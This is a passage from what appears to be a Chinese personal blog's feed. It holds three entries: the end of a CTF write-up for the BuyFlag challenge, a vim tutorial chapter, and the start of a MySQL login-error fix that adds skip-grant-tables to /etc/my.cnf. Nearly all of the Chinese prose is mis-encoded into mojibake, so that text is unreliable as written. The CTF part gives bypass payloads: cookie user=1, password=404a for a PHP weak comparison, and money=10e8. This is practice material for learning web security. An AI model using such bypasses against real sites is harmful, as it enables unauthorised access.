2019]BuyFlag"></a>20.[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p>è¿™é¢˜è€ƒæŸ¥çš„ä¸»è¦æ˜¯</p><p>è¿›å…¥é¢˜ç›®çœ‹åˆ°ä¸€æ®µè¯ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202202041535251.png"></p><p>å¯ä»¥çœ‹åˆ°æœ‰èº«ä»½è®¤è¯ç›¸å…³ï¼ŒåŒæ—¶è¿˜æœ‰passwordï¼Œå¯ä»¥å…ˆçœ‹çœ‹cookieï¼Œçœ‹åˆ°user=0ï¼Œå¤§è‡´çŒœä¸ª0æ˜¯falseï¼Œ1æ˜¯trueï¼Œæ‰€ä»¥æ”¹ä¸º1ã€‚</p><p>ç„¶åæŸ¥çœ‹é¡µé¢æºä»£ç å‘ç°æœ‰æ®µä»£ç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span>post money <span class="token keyword">and</span> password<span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"password can't be number&lt;/br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Password Right!&lt;/br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°±æ˜¯å¼±æ¯”è¾ƒï¼Œpayloadï¼špassword=404aï¼ŒæˆåŠŸç»•è¿‡:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202202041535252.png"></p><p>æ­¤æ—¶å°±å·®ä¹°flagäº†ï¼Œæ³¨æ„ä¸Šé¢çš„æºç ï¼Œä¹Ÿæœ‰<code>post money</code>ï¼Œè¿™ä¸ªåˆ«å¿˜äº†ï¼é‚£å°±payloadï¼špassword=404a&amp;money=100000000:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202202041535253.png"></p><p>æç¤ºå¤ªé•¿äº†ï¼Œé‚£å°±ç”¨<font color="#FF5E3A" size="3">ç§‘å­¦è®¡æ•°æ³•</font>ï¼Œpayloadï¼špassword=404a&amp;money=10e8ï¼Œå¾—åˆ°flagğŸ˜Šï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202202041535254.png"></p><hr><p>å¥½å•¦ï¼Œåˆæ˜¯åé“é¢˜ï¼Œç»§ç»­åŠªåŠ›ï¼Œä¸»è¦å°±æ˜¯è§é¢˜å‹å§ï¼Œä»¥åŠæ‹¿åˆ°ä¸€é“é¢˜è¯¥æ€ä¹ˆå‡ºå‘ã€‚</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659121.jpg" style="zoom:150%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://huhu-myh.github.io/categories/CTF/"/>
    
    
    <category term="buuç»ƒä¹ " scheme="https://huhu-myh.github.io/tags/buu%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Linuxå­¦ä¹ -ç¬¬ä¸‰ç« </title>
    <link href="https://huhu-myh.github.io/posts/myh10007.html"/>
    <id>https://huhu-myh.github.io/posts/myh10007.html</id>
    <published>2022-01-17T06:38:08.000Z</published>
    <updated>2022-02-06T11:56:23.411Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ç¬¬ä¸‰ç« ï¼šä½¿ç”¨ç¼–è¾‘å™¨"><a href="#ç¬¬ä¸‰ç« ï¼šä½¿ç”¨ç¼–è¾‘å™¨" class="headerlink" title="ç¬¬ä¸‰ç« ï¼šä½¿ç”¨ç¼–è¾‘å™¨"></a>ç¬¬ä¸‰ç« ï¼šä½¿ç”¨ç¼–è¾‘å™¨</h2><h3 id="3-1-æ£€æŸ¥vimè½¯ä»¶åŒ…ï¼Œå®‰è£…vim"><a href="#3-1-æ£€æŸ¥vimè½¯ä»¶åŒ…ï¼Œå®‰è£…vim" class="headerlink" title="3.1 æ£€æŸ¥vimè½¯ä»¶åŒ…ï¼Œå®‰è£…vim"></a>3.1 æ£€æŸ¥<code>vim</code>è½¯ä»¶åŒ…ï¼Œå®‰è£…<code>vim</code></h3><p>æœ‰çš„å‘è¡Œç‰ˆé»˜è®¤çš„<code>vim</code>ç¼–è¾‘å™¨å¹¶ä¸æ˜¯å®Œæ•´çš„åŒ…ï¼Œåªæ˜¯<code>vim.tiny  </code>ï¼Œæä¾›å°‘é‡çš„ç¼–è¾‘åŠŸèƒ½ã€‚æ‰€ä»¥é¦–å…ˆæ£€æŸ¥ä¸€ä¸‹åŒ…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">which</span> <span class="token function">vi</span>/usr/bin/vi$ readlink -f /usr/bin/vi    <span class="token comment">#readlink â€“få‘½ä»¤èƒ½å¤Ÿç«‹åˆ»æ‰¾å‡ºé“¾æ¥æ–‡ä»¶çš„æœ€åä¸€ç¯ã€‚</span>/usr/bin/vim.tiny<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶å°±è¦å®‰è£…<code>vim</code>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">vim</span>$ readlink -f /usr/bin/vi/usr/bin/vim.basic    <span class="token comment">#å®‰è£…æˆåŠŸäº†</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-vimåŸºç¡€"><a href="#3-2-vimåŸºç¡€" class="headerlink" title="3.2 vimåŸºç¡€"></a>3.2 vimåŸºç¡€</h3><p>å¯åŠ¨<code>vim</code>ç¼–è¾‘å™¨:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">vim</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚åœ¨å¯åŠ¨vimæ—¶æœªæŒ‡å®šæ–‡ä»¶åï¼Œæˆ–è€…è¿™ä¸ªæ–‡ä»¶ä¸å­˜åœ¨ï¼Œ vimä¼š<strong>å¼€è¾Ÿä¸€æ®µæ–°çš„ç¼“å†²åŒºåŸŸ</strong>æ¥ç¼–è¾‘ã€‚å¦‚æœä½ åœ¨å‘½ä»¤è¡Œä¸‹æŒ‡å®šäº†ä¸€ä¸ªå·²æœ‰æ–‡ä»¶çš„åå­—ï¼Œ vimä¼šå°†æ–‡ä»¶çš„æ•´ä¸ªå†…å®¹éƒ½<strong>è¯»åˆ°ä¸€å—ç¼“å†²åŒºåŸŸ</strong>æ¥å‡†å¤‡ç¼–è¾‘ ã€‚</p><p>vimç¼–è¾‘å™¨ä¼šæ£€æµ‹ä¼šè¯ç»ˆç«¯çš„ç±»å‹ï¼Œå¹¶ç”¨<strong>å…¨å±æ¨¡å¼</strong>å°†æ•´ä¸ªæ§åˆ¶å°çª—å£ä½œä¸ºç¼–è¾‘å™¨åŒºåŸŸã€‚<br>æœ€åˆçš„vimç¼–è¾‘çª—å£æ˜¾ç¤ºäº†æ–‡ä»¶çš„å†…å®¹ï¼ˆå¦‚æœæœ‰å†…å®¹çš„è¯ï¼‰ï¼Œå¹¶åœ¨çª—å£çš„åº•éƒ¨æ˜¾ç¤ºäº†ä¸€æ¡æ¶ˆæ¯è¡Œã€‚å¦‚æœæ–‡ä»¶å†…å®¹å¹¶æœªå æ®æ•´ä¸ªå±å¹•ï¼Œ vimä¼šåœ¨<strong>éæ–‡ä»¶å†…å®¹è¡Œæ”¾ç½®ä¸€ä¸ªæ³¢æµªçº¿</strong> ã€‚å¦‚å›¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux3/202201171711057.png"></p><p>vimç¼–è¾‘å™¨æœ‰<strong>ä¸¤ç§æ“ä½œæ¨¡å¼</strong>ï¼š</p><ul><li><font color="#FF5E3A" size="3">æ™®é€šæ¨¡å¼</font></li><li><font color="#FF5E3A" size="3">æ’å…¥æ¨¡å¼</font></li></ul><p>åˆšæ‰“å¼€è¦ç¼–è¾‘çš„æ–‡ä»¶æ—¶ï¼ˆæˆ–æ–°å»ºä¸€ä¸ªæ–‡ä»¶æ—¶ï¼‰ï¼Œ vimç¼–è¾‘å™¨ä¼šè¿›å…¥æ™®é€šæ¨¡å¼ã€‚<font color="#FF5E3A" size="3">åœ¨æ™®é€šæ¨¡å¼ä¸­ï¼Œ vimç¼–è¾‘å™¨ä¼šå°†æŒ‰é”®è§£é‡Šæˆå‘½ä»¤ã€‚</font>  </p><p>åœ¨æ’å…¥æ¨¡å¼ä¸‹ï¼Œ vimä¼šå°†ä½ åœ¨å½“å‰å…‰æ ‡ä½ç½®è¾“å…¥çš„æ¯ä¸ªé”®éƒ½æ’å…¥åˆ°ç¼“å†²åŒºã€‚<font color="#FF5E3A" size="3">æŒ‰ä¸‹ié”®å°±å¯ä»¥è¿›å…¥æ’å…¥æ¨¡å¼</font>ã€‚è¦é€€å‡ºæ’å…¥æ¨¡å¼å›åˆ°æ™®é€šæ¨¡å¼ï¼ŒæŒ‰ä¸‹é”®ç›˜ä¸Šçš„<strong>é€€å‡ºé”®ï¼ˆ ESCé”®ï¼‰</strong>å°±å¯ä»¥äº†ã€‚  </p><p>åœ¨æ™®é€šæ¨¡å¼ä¸­ï¼Œå¯ä»¥ç”¨æ–¹å‘é”®åœ¨æ–‡æœ¬åŒºåŸŸ<strong>ç§»åŠ¨å…‰æ ‡</strong> æˆ–è€…ä½¿ç”¨å¦‚ä¸‹é”®ï¼š</p><ul><li>hï¼šå·¦ç§»ä¸€ä¸ªå­—ç¬¦ã€‚  </li><li>jï¼šä¸‹ç§»ä¸€è¡Œï¼ˆæ–‡æœ¬ä¸­çš„ä¸‹ä¸€è¡Œï¼‰ã€‚  </li><li>kï¼šä¸Šç§»ä¸€è¡Œï¼ˆæ–‡æœ¬ä¸­çš„ä¸Šä¸€è¡Œï¼‰ã€‚  </li><li>lï¼šå³ç§»ä¸€ä¸ªå­—ç¬¦ã€‚  </li></ul><p>åœ¨å¤§çš„æ–‡æœ¬æ–‡ä»¶ä¸­ä¸€è¡Œä¸€è¡Œåœ°æ¥å›ç§»åŠ¨ä¼šç‰¹åˆ«éº»çƒ¦ï¼Œå¹¸è€Œvimæä¾›äº†ä¸€äº›èƒ½å¤Ÿæé«˜ç§»åŠ¨é€Ÿåº¦<br>çš„å‘½ä»¤ã€‚</p><ul><li><code>PageDown</code>ï¼ˆæˆ–Ctrl+Fï¼‰ï¼šä¸‹ç¿»ä¸€å±ã€‚</li><li><code>PageUp</code>ï¼ˆæˆ–Ctrl+Bï¼‰ï¼šä¸Šç¿»ä¸€å±ã€‚</li><li>Gï¼šç§»åˆ°ç¼“å†²åŒºçš„æœ€åä¸€è¡Œã€‚</li><li><code>num G</code>ï¼šç§»åŠ¨åˆ°ç¼“å†²åŒºä¸­çš„ç¬¬<code>num</code>è¡Œã€‚</li><li>ggï¼šç§»åˆ°ç¼“å†²åŒºçš„ç¬¬ä¸€è¡Œã€‚  </li></ul><p>vimç¼–è¾‘å™¨åœ¨æ™®é€šæ¨¡å¼ä¸‹æœ‰ä¸ªç‰¹åˆ«çš„åŠŸèƒ½å«<font color="#FF5E3A" size="3">å‘½ä»¤è¡Œæ¨¡å¼</font>ã€‚å‘½ä»¤è¡Œæ¨¡å¼æä¾›äº†ä¸€ä¸ªäº¤äº’å¼å‘½ä»¤è¡Œï¼Œ<strong>å¯ä»¥è¾“å…¥é¢å¤–çš„å‘½ä»¤æ¥æ§åˆ¶vimçš„è¡Œä¸º</strong>ã€‚è¦è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼ï¼Œåœ¨æ™®é€šæ¨¡å¼ä¸‹<font color="#FF5E3A" size="3">æŒ‰ä¸‹å†’å·é”®</font>ã€‚å…‰æ ‡ä¼šç§»åŠ¨åˆ°æ¶ˆæ¯è¡Œï¼Œç„¶åå‡ºç°å†’å·ï¼Œç­‰å¾…è¾“å…¥å‘½ä»¤ã€‚  </p><p>åœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸‹æœ‰å‡ ä¸ªå‘½ä»¤å¯ä»¥<strong>å°†ç¼“å†²åŒºçš„æ•°æ®ä¿å­˜åˆ°æ–‡ä»¶ä¸­å¹¶é€€å‡ºvim</strong>ã€‚</p><ul><li>qï¼šå¦‚æœæœªä¿®æ”¹ç¼“å†²åŒºæ•°æ®ï¼Œé€€å‡º</li><li>q!ï¼š<strong>å–æ¶ˆ</strong>æ‰€æœ‰å¯¹ç¼“å†²åŒºæ•°æ®çš„ä¿®æ”¹å¹¶é€€å‡ºã€‚</li><li>w filenameï¼šå°†æ–‡ä»¶ä¿å­˜åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚</li><li>wqï¼šå°†ç¼“å†²åŒºæ•°æ®<strong>ä¿å­˜</strong>åˆ°æ–‡ä»¶ä¸­å¹¶é€€å‡ºã€‚ </li></ul><h3 id="3-3-ç¼–è¾‘æ•°æ®"><a href="#3-3-ç¼–è¾‘æ•°æ®" class="headerlink" title="3.3 ç¼–è¾‘æ•°æ®"></a>3.3 ç¼–è¾‘æ•°æ®</h3><p>åœ¨æ’å…¥æ¨¡å¼ä¸‹ï¼Œä½ å¯ä»¥å‘ç¼“å†²åŒºæ’å…¥æ•°æ®ã€‚ç„¶è€Œæœ‰æ—¶å°†æ•°æ®è¾“å…¥åˆ°ç¼“å†²åŒºä¸­åï¼Œä½ éœ€è¦å†å¯¹å…¶è¿›è¡Œæ·»åŠ æˆ–åˆ é™¤ã€‚åœ¨<strong>æ™®é€šæ¨¡å¼ä¸‹</strong>ï¼Œ vimç¼–è¾‘å™¨æä¾›äº†ä¸€äº›å‘½ä»¤æ¥<strong>ç¼–è¾‘ç¼“å†²åŒºä¸­çš„æ•°æ®</strong>ã€‚ä¸‹è¡¨åˆ—å‡ºäº†ä¸€äº›å¸¸ç”¨çš„vimç¼–è¾‘å‘½ä»¤ã€‚  </p><hr><table><thead><tr><th>å‘½ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>dd</td><td>åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œ</td></tr><tr><td>x</td><td>åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨ä½ç½®çš„å­—ç¬¦</td></tr><tr><td>dw</td><td>åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨ä½ç½®çš„å•è¯</td></tr><tr><td>d$</td><td>åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨ä½ç½®è‡³è¡Œå°¾çš„å†…å®¹</td></tr><tr><td>u</td><td>æ’¤é”€å‰ä¸€ç¼–è¾‘å‘½ä»¤</td></tr><tr><td>J</td><td>åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œè¡Œå°¾çš„æ¢è¡Œç¬¦ï¼ˆæ‹¼æ¥è¡Œï¼‰</td></tr><tr><td>A</td><td>åœ¨å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œè¡Œå°¾è¿½åŠ æ•°æ®ï¼ˆç›´æ¥è¿›å…¥äº†æ’å…¥æ¨¡å¼ï¼‰</td></tr><tr><td>a</td><td>åœ¨å½“å‰å…‰æ ‡åè¿½åŠ æ•°æ®ï¼ˆç›´æ¥è¿›å…¥äº†æ’å…¥æ¨¡å¼ï¼‰</td></tr><tr><td>r char</td><td>ç”¨charæ›¿æ¢å½“å‰å…‰æ ‡æ‰€åœ¨ä½ç½®çš„å•ä¸ªå­—ç¬¦</td></tr></tbody></table><hr><p>è¯´æ˜ åœ¨vimç¼–è¾‘å™¨çš„æ™®é€šæ¨¡å¼ä¸‹ä½¿ç”¨é€€æ ¼é”®ï¼ˆ Backspaceé”®ï¼‰å’Œåˆ é™¤é”®ï¼ˆ Deleteé”®ï¼‰æ—¶è¦ç•™å¿ƒã€‚vimç¼–è¾‘å™¨é€šå¸¸ä¼š<strong>å°†åˆ é™¤é”®è¯†åˆ«æˆxå‘½ä»¤</strong>çš„åŠŸèƒ½ï¼Œåˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨ä½ç½®çš„å­—ç¬¦ã€‚ vimç¼–è¾‘å™¨åœ¨æ™®é€šæ¨¡å¼ä¸‹é€šå¸¸ä¸è¯†åˆ«é€€æ ¼é”®ã€‚  </p><hr><h3 id="3-4-å¤åˆ¶å’Œç²˜è´´"><a href="#3-4-å¤åˆ¶å’Œç²˜è´´" class="headerlink" title="3.4 å¤åˆ¶å’Œç²˜è´´"></a>3.4 å¤åˆ¶å’Œç²˜è´´</h3><h4 id="3-4-1-ç²˜è´´å†…å®¹"><a href="#3-4-1-ç²˜è´´å†…å®¹" class="headerlink" title="3.4.1 ç²˜è´´å†…å®¹"></a>3.4.1 ç²˜è´´å†…å®¹</h4><p><font color="#FF5E3A" size="3">vimåœ¨åˆ é™¤æ•°æ®æ—¶ï¼Œå®é™…ä¸Šä¼šå°†æ•°æ®ä¿å­˜åœ¨å•ç‹¬çš„ä¸€ä¸ªå¯„å­˜å™¨ä¸­ã€‚å¯ä»¥ç”¨på‘½ä»¤å–å›æ•°æ®ã€‚ </font> </p><p>ä¸¾ä¾‹æ¥è¯´ï¼Œå¯ä»¥ç”¨<code>dd</code>å‘½ä»¤åˆ é™¤ä¸€è¡Œæ–‡æœ¬ï¼Œç„¶åæŠŠå…‰æ ‡ç§»åŠ¨åˆ°ç¼“å†²åŒºçš„æŸä¸ªè¦æ”¾ç½®è¯¥è¡Œæ–‡æœ¬çš„ä½ç½®ï¼Œç„¶åç”¨<code>p</code>å‘½ä»¤ã€‚è¯¥å‘½ä»¤ä¼šå°†æ–‡æœ¬æ’å…¥åˆ°å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œä¹‹åã€‚å¯ä»¥å°†å®ƒå’Œä»»ä½•åˆ é™¤æ–‡æœ¬çš„å‘½ä»¤ä¸€èµ·æ­é…ä½¿ç”¨ã€‚  (æ³¨æ„på‘½ä»¤ç²˜è´´çš„åªæ˜¯ä¸Š<strong>ä¸€æ¬¡</strong>åˆ é™¤çš„å†…å®¹ã€‚)</p><h4 id="3-4-2-å¤åˆ¶å†…å®¹"><a href="#3-4-2-å¤åˆ¶å†…å®¹" class="headerlink" title="3.4.2 å¤åˆ¶å†…å®¹"></a>3.4.2 å¤åˆ¶å†…å®¹</h4><p>vimä¸­å¤åˆ¶å‘½ä»¤æ˜¯yï¼ˆä»£è¡¨yankï¼‰ã€‚å¯ä»¥åœ¨yåé¢ä½¿ç”¨å’Œdå‘½ä»¤ç›¸åŒçš„ç¬¬äºŒå­—ç¬¦ï¼ˆ ywè¡¨ç¤ºå¤åˆ¶ä¸€ä¸ªå•è¯ï¼Œ y$è¡¨ç¤ºå¤åˆ¶åˆ°è¡Œå°¾ï¼‰ã€‚åœ¨å¤åˆ¶æ–‡æœ¬åï¼ŒæŠŠå…‰æ ‡ç§»åŠ¨åˆ°ä½ æƒ³æ”¾ç½®æ–‡æœ¬çš„åœ°æ–¹ï¼Œè¾“å…¥på‘½ä»¤ã€‚å¤åˆ¶çš„æ–‡æœ¬å°±ä¼šå‡ºç°åœ¨è¯¥ä½ç½®  ã€‚</p><h4 id="3-4-3-å¤åˆ¶å†…å®¹-å¯è§†åŒ–æ¨¡å¼"><a href="#3-4-3-å¤åˆ¶å†…å®¹-å¯è§†åŒ–æ¨¡å¼" class="headerlink" title="3.4.3 å¤åˆ¶å†…å®¹-å¯è§†åŒ–æ¨¡å¼"></a>3.4.3 å¤åˆ¶å†…å®¹-å¯è§†åŒ–æ¨¡å¼</h4><p>æŒ‰ä¸‹<code>v</code>é”®è¿›å…¥å¯è§†åŒ–æ¨¡å¼ã€‚ä¸‹ä¸€æ­¥ï¼Œç§»åŠ¨å…‰æ ‡æ¥è¦†ç›–ä½ æƒ³è¦å¤åˆ¶çš„æ–‡æœ¬ï¼ˆç”šè‡³å¯ä»¥å‘ä¸‹ç§»åŠ¨å‡ è¡Œæ¥å¤åˆ¶æ›´å¤šè¡Œçš„æ–‡æœ¬ï¼‰ã€‚åœ¨ç§»åŠ¨å…‰æ ‡æ—¶ï¼Œ vimä¼šé«˜äº®æ˜¾ç¤ºå¤åˆ¶åŒºåŸŸçš„æ–‡æœ¬ã€‚åœ¨è¦†ç›–äº†è¦å¤åˆ¶çš„æ–‡æœ¬åï¼ŒæŒ‰yé”®æ¥æ¿€æ´»å¤åˆ¶å‘½ä»¤ã€‚ç§»åŠ¨å…‰æ ‡åˆ°è¦æ”¾ç½®çš„ä½ç½®ï¼Œä½¿ç”¨på‘½ä»¤æ¥ç²˜è´´ã€‚  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux3/202201171711059.png"></p><h3 id="3-5-æŸ¥æ‰¾å’Œæ›¿æ¢"><a href="#3-5-æŸ¥æ‰¾å’Œæ›¿æ¢" class="headerlink" title="3.5 æŸ¥æ‰¾å’Œæ›¿æ¢"></a>3.5 æŸ¥æ‰¾å’Œæ›¿æ¢</h3><h4 id="3-5-1-æŸ¥æ‰¾"><a href="#3-5-1-æŸ¥æ‰¾" class="headerlink" title="3.5.1 æŸ¥æ‰¾"></a>3.5.1 æŸ¥æ‰¾</h4><p>æŒ‰ä¸‹æ–œçº¿ <code>/é”®</code>ï¼Œå…‰æ ‡ä¼šè·‘åˆ°æ¶ˆæ¯è¡Œï¼Œç„¶åvimä¼šæ˜¾ç¤ºå‡ºæ–œçº¿ã€‚åœ¨è¾“å…¥ä½ è¦æŸ¥æ‰¾çš„æ–‡æœ¬åï¼ŒæŒ‰ä¸‹å›è½¦é”®ã€‚ä¼šå‡ºç°ä¸‰ç§å¯èƒ½çš„ç»“æœï¼š</p><ul><li>è¦æŸ¥æ‰¾çš„æ–‡æœ¬å‡ºç°åœ¨å…‰æ ‡å½“å‰ä½ç½®ä¹‹åï¼Œåˆ™å…‰æ ‡ä¼šè·³åˆ°è¯¥æ–‡æœ¬å‡ºç°çš„ç¬¬ä¸€ä¸ªä½ç½®ã€‚  </li><li>è¦æŸ¥æ‰¾çš„æ–‡æœ¬æœªåœ¨å…‰æ ‡å½“å‰ä½ç½®ä¹‹åå‡ºç°ï¼Œåˆ™å…‰æ ‡ä¼šç»•è¿‡æ–‡ä»¶æœ«å°¾ï¼Œå‡ºç°åœ¨è¯¥æ–‡æœ¬æ‰€åœ¨çš„ç¬¬ä¸€ä¸ªä½ç½®ï¼ˆå¹¶ç”¨ä¸€æ¡æ¶ˆæ¯æŒ‡æ˜ï¼‰ã€‚</li><li>è¾“å‡ºä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼Œè¯´æ˜åœ¨æ–‡ä»¶ä¸­æ²¡æœ‰æ‰¾åˆ°è¦æŸ¥æ‰¾çš„æ–‡æœ¬ã€‚  </li></ul><p>è¦ç»§ç»­æŸ¥æ‰¾åŒä¸€ä¸ªå•è¯ï¼ŒæŒ‰ä¸‹æ–œçº¿é”®ï¼Œç„¶åæŒ‰å›è½¦é”®ã€‚æˆ–è€…ä½¿ç”¨<code>né”®</code>ï¼Œè¡¨ç¤ºä¸‹ä¸€ä¸ªï¼ˆ nextï¼‰ã€‚    </p><h4 id="3-5-2-æ›¿æ¢"><a href="#3-5-2-æ›¿æ¢" class="headerlink" title="3.5.2 æ›¿æ¢"></a>3.5.2 æ›¿æ¢</h4><p><font color="#FF5E3A" size="3">å¿…é¡»è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼æ‰èƒ½ä½¿ç”¨æ›¿æ¢å‘½ä»¤ã€‚</font>æ›¿æ¢å‘½ä»¤çš„æ ¼å¼æ˜¯ï¼š<code>:s/old/new/</code> ï¼Œvimç¼–è¾‘å™¨ä¼šè·³åˆ°oldç¬¬ä¸€æ¬¡å‡ºç°çš„åœ°æ–¹ï¼Œå¹¶ç”¨newæ¥æ›¿æ¢ã€‚  </p><p>å¯ä»¥å¯¹æ›¿æ¢å‘½ä»¤ä½œä¸€äº›ä¿®æ”¹æ¥æ›¿æ¢å¤šå¤„æ–‡æœ¬ï¼š  </p><ul><li><code>:s/old/new/g</code>ï¼šæ›¿æ¢å…‰æ ‡æ‰€åœ¨è¡Œçš„æ‰€æœ‰oldã€‚  </li><li><code>:n,ms/old/new/g</code>ï¼šæ›¿æ¢è¡Œå·nå’Œmä¹‹é—´æ‰€æœ‰oldã€‚  </li><li><code>:%s/old/new/g</code>ï¼šæ›¿æ¢æ•´ä¸ªæ–‡ä»¶ä¸­çš„æ‰€æœ‰oldã€‚  </li><li><code>:%s/old/new/gc</code>ï¼šæ›¿æ¢æ•´ä¸ªæ–‡ä»¶ä¸­çš„æ‰€æœ‰oldï¼Œä½†åœ¨æ¯æ¬¡å‡ºç°æ—¶æç¤ºã€‚  </li></ul><hr><p>è¿™é‡Œå°±æ˜¯åŸºæœ¬çš„vimç¼–è¾‘å™¨å‘½ä»¤ï¼Œéœ€è¦ç»å¸¸ä½¿ç”¨å¢åŠ æ‰‹æŒ‡è®°å¿†ï¼Œè¿˜æœ‰è®¸å¤šå…¶ä»–çš„ç¼–è¾‘å™¨ï¼Œå…ˆå­¦ä¼šè¿™ä¸ªå†å­¦å­¦åˆ«çš„~</p><p><font color="#FF9999" size="3">æ–‡ç« å‚è€ƒï¼šLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆ by å¸ƒé²å§†ï¼Œå¸ƒé›·æ–¯çº³æ±‰ (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux3/202201171711060.jpg" style="zoom:150%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="å­¦ä¹ " scheme="https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="linux" scheme="https://huhu-myh.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Linuxç™»å½•mysqlæŠ¥é”™</title>
    <link href="https://huhu-myh.github.io/posts/myh10006.html"/>
    <id>https://huhu-myh.github.io/posts/myh10006.html</id>
    <published>2022-01-16T03:53:04.000Z</published>
    <updated>2022-02-15T02:55:16.086Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="mysqlç™»å½•æŠ¥é”™ï¼šERROR-1045-28000"><a href="#mysqlç™»å½•æŠ¥é”™ï¼šERROR-1045-28000" class="headerlink" title="mysqlç™»å½•æŠ¥é”™ï¼šERROR 1045 (28000)"></a>mysqlç™»å½•æŠ¥é”™ï¼šERROR 1045 (28000)</h2><p>åœ¨ä½¿ç”¨xshellè¿æ¥æœåŠ¡å™¨ç™»é™†mysqlçš„æ—¶å€™ï¼Œå‡ºç°Access denied for user â€˜rootâ€™@â€™localhostâ€™ (using password: YES) æ‹’ç»è®¿é—®ã€‚emmmè¿™å°±å¾ˆå°´å°¬ï¼Œæ¥ç€æˆ‘ç™»ä¸ŠæœåŠ¡å™¨çš„ç»ˆç«¯ä¹Ÿä¸è¡Œï¼ŒæŸ¥äº†ä¸€ä¸‹è§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š</p><h4 id="1ã€vim-etc-my-cnfæ–‡ä»¶"><a href="#1ã€vim-etc-my-cnfæ–‡ä»¶" class="headerlink" title="1ã€vim /etc/my.cnfæ–‡ä»¶"></a>1ã€vim /etc/my.cnfæ–‡ä»¶</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/my.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ [mysqld] åæ·»åŠ   skip-grant-tables 